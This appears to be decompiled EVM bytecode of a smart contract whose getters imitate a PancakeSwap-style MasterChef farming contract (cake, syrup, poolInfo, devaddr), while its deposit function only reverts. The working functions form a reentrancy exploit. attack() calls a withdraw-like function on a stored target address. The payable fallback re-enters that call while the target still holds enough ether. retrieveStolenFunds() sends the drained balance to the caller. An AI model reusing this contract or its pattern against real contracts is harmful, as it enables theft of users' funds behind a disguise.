contract main {




// =====================  Runtime code  =====================


address stor0;
uint256 stor1;
address cakeAddress;
address syrupAddress;
address devaddr;
uint256 cakePerBlock;
uint256 BONUS_MULTIPLIER;
array of struct poolInfo;
mapping of struct userInfo;
uint256 totalAllocPoint;
uint256 startBlock;

function cakePerBlock() {
    return cakePerBlock
}

function poolLength() {
    return poolInfo.length
}

function poolInfo(uint256 arg1) {
    require calldata.size - 4 >= 32
    require arg1 < poolInfo.length
    return poolInfo[arg1].field_0, poolInfo[arg1].field_256, poolInfo[arg1].field_512, poolInfo[arg1].field_768
}

function totalAllocPoint() {
    return totalAllocPoint
}

function startBlock() {
    return startBlock
}

function syrup() {
    return syrupAddress
}

function BONUS_MULTIPLIER() {
    return BONUS_MULTIPLIER
}

function userInfo(uint256 arg1, address arg2) {
    require calldata.size - 4 >= 64
    return userInfo[arg1][arg2].field_0, userInfo[arg1][arg2].field_256
}

function devaddr() {
    return devaddr
}

function cake() {
    return cakeAddress
}

function sub_10eed557(?) {
    return eth.balance(stor0)
}

function deposit(uint256 arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    if arg1 >= poolInfo.length:
        revert with 0, 'validatePool: pool exists?'
}

function retrieveStolenFunds() {
    call msg.sender with:
       value eth.balance(this.address) wei
         gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function attack() payable {
    require ext_code.size(stor0)
    call stor0.0x5312ea8e with:
         gas gas_remaining wei
        args stor1
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function _fallback() payable {
    if eth.balance(stor0) >= stor1:
        require ext_code.size(stor0)
        call stor0.0x5312ea8e with:
             gas gas_remaining wei
            args stor1
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
}



}
